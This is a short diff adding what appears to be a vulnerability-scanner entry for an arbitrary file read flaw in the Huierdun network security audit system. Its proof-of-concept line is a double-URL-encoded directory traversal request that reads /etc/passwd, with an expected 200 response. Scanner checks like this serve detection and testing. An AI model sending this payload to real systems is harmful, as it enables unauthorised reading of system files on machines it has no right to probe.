@@ -1,0 +1,3 @@
+name: "惠尔顿-网络安全审计系统存在任意文件读取漏洞"
+poc: "/download/..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd"
+status_code: 200
